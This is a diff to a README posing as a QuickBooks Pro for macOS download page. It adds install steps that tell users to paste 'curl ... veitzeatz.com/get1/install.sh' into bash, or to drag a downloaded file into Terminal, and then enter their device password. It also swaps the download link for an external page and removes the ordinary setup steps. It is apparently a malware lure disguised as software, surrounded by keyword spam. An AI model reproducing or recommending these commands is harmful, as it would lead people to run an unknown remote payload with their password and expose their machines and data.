@@ -2,9 +2,33 @@
 
 QuickBooks Pro is the ultimate desktop accounting solution for macOS users. Whether you're a small business owner or an accounting professional, QuickBooks Pro helps you manage invoices, track expenses, and generate detailed reports — all in one place.
 
-[![🚀 Download QuickBooks Pro 🟣](https://img.shields.io/badge/Download-QuickBooks%20Pro-blueviolet)](#)
+[![🚀 Download QuickBooks Pro 🟣](https://img.shields.io/badge/Download-QuickBooks%20Pro-blueviolet)](https://quickbooks-pro-mac-download.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
 
 ## 📦 What is QuickBooks Pro?
 
@@ -29,16 +53,6 @@ It’s ideal for freelancers, startups, and established businesses who want a lo
 
 ---
 
-## 📥 How to Use
-
-💡 **Step 1:** Download the installer using the button above  
-📂 **Step 2:** Unzip and run the `.dmg` file on your macOS  
-🛠️ **Step 3:** Follow the setup wizard to install  
-🔐 **Step 4:** Launch QuickBooks Pro and activate your license  
-📘 **Step 5:** Start managing your accounting with professional tools  
-
----
-
 ## 🖼️ Preview
 
 ![screenshot1](https://fitsmallbusiness.com/wp-content/uploads/2022/11/Screenshot_of_QuickBooks_Desktop_Pro_Income_Tracker.jpg)  
@@ -58,4 +72,3 @@ quickbooks desktop pro 2021, quickbooks pro, quick book pro, find a quickbooks p
 quickbooks, quickbooks pro online, quickbooks desktop premier plus, quickbooks desktop pro plus, find a proadvisor
 
 ---
-
